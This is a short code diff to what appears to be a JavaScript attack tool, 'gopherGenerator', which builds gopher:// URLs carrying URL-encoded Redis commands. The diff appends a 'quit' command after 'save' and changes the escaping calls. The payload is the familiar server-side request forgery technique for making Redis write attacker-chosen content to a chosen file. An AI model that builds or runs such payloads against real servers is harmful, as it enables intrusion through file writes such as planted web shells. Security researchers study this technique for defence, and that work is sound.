@@ -44,13 +44,14 @@ const gopherGenerator = {
                       `${this.filename}\r\n` +
                       `*1\r\n` +
                       `$4\r\n` +
-                      `save\r\n\n`;
+                      `save\r\n` +
+                      `quit\r\n`;
 
         payload = querystring.escape(payload)
-            .replaceAll(/'/g, '%27')
-            .replaceAll(/\(/g, '%28')
-            .replaceAll(/\)/g, '%29')
-            .replaceAll(/\+/g, '%20');
+            .replace(/'/g, '%27')
+            .replace(/\(/g, '%28')
+            .replace(/\)/g, '%29')
+            .replace(/\+/g, '%20');
 
         return `gopher://${this.host}:${this.port}/_${payload}`;
     }
